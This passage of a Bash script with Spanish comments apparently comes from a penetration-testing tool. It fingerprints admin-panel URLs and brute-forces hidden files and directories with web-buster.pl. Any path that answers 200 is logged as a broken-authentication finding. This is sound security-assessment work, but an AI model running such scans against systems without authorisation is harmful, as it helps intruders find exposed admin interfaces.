		path_web=`echo $url | cut -d "/" -f 4-5`		

		echo -e "\t[+] Identificando "
		echo "webData.pl -t $host -d "/$path_web" -p $port -s $proto_http -e todo -l /dev/null -r 4 2>/dev/null"
		web_fingerprint=`webData.pl -t $host -d "/$path_web" -p $port -s $proto_http -e todo -l /dev/null -r 4 2>/dev/null | sed 's/\n//g'`
		web_fingerprint=`echo "$web_fingerprint" | tr '[:upper:]' '[:lower:]' | tr -d ";"` # a minusculas y eliminar  ;		
		#echo "web_fingerprint ($web_fingerprint)"
		#############
		if [[ ${web_fingerprint} == *"404 not found"* ]]; then
			echo -e "\t[+] Falso positivo (404) "
		else
			echo "$url;$web_fingerprint" >> servicios/admin-web2.txt
			if [[ ${url} != *"Listado directorio"*  &&  ${url} != *"wp-"* &&  ${url} != *".action"* &&  ${url} != *"index"* &&  ${url} != *"cpanel"* &&  ${url} != *"whm"* &&  ${url} != *"webmail"*  ]] ; then
				if [[ ${path_web} != *"."* && ${path_web} != *"manual"* && ${path_web} != *"dashboard"* && ${path_web} != *"docs"* && ${path_web} != *"license"* && ${path_web} != *"wp"* && ${path_web} != *"aspnet_client"*  && ${path_web} != *"autodiscover"*  && ${url} != *"manager/html"* && ${path_web} != *"manual"* && ${path_web} != *"phppgadmin"* && ${path_web} != *"controlpanel"*  ]];then   # si es un directorio (no un archivo) y el listado de directorios no esta habilitado
					egrep -i "apache|nginx|kong|IIS" .enumeracion2/"$host"_"$port"_webData.txt | egrep -qiv "302 Found|Always200-OK|AngularJS|BladeSystem|cisco|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Open Source Routing Machine|oracle|owa|ownCloud|Pfsense|Roundcube|Router|Taiga|webadmin|Zentyal|Zimbra" # solo el segundo egrep poner "-q"
					greprc=$?
					# si no es tomcat/phpmyadmin/joomla descubrir rutas de 2do nivel accesibles
					if [[ $greprc -eq 0 && $web_fingerprint != *"tomcat"* && $web_fingerprint != *"phpmyadmin"* && $web_fingerprint != *"pgadmin"*  && $web_fingerprint != *"joomla"*  && $web_fingerprint != *"wordpress"* && $web_fingerprint != *"cms"*  && $web_fingerprint != *"sqlite"* && $web_fingerprint != *"index"* && $web_fingerprint != *"Webmail"* ]];then 

						echo "path_web ($path_web)"
						
						if [ -z "$path_web" ]; then 	 # if vacio
							echo "Ya se escaneo la raiz del web server"
						else
							echo -e "\t[i] Buscar mas archivos y directorios dentro de  $proto_http://$host:$port/$path_web"
							echo "Escaneando con la opcion -m archivosPeligrosos"
							path_web_sin_slash=$(echo "$path_web" | sed 's/\///g')
							web-buster.pl -r 0 -t $host -p $port -h 50 -d /$path_web -m archivosPeligrosos -s $proto_http >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"-perdidaAutenticacion.txt
						fi

						if [ "$MODE" == "total" ]; then 							
							web-buster.pl -r 0 -t $host -p $port -h 50 -d /$path_web -m folders -s $proto_http >> logs/vulnerabilidades/"$host"_"$port"_perdidaAutenticacion.txt 
						fi		

						egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_perdidaAutenticacion.txt 2>/dev/null | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_perdidaAutenticacion.txt 
						egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"-perdidaAutenticacion.txt  2>/dev/null | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"-perdidaAutenticacion.txt
					else
						echo -e "\t[i] CMS identificado o es un archivo"
					fi
				else
					echo -e "\t[i] El listado de directorios esta habilitado o es un archivo"
				fi
			fi # Es directorio	
		fi #404												
	done < servicios/admin-web.txt	
fi
sort servicios/admin-web2.txt 2>/dev/null | uniq > servicios/admin-web-fingerprint.txt
rm servicios/admin-web2.txt 2>/dev/null

insert_data	
# delete empty files
find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
#Insertar paneles administrativos servicios/web-admin-fingerprint.txt
insert_data_admin 2>/dev/null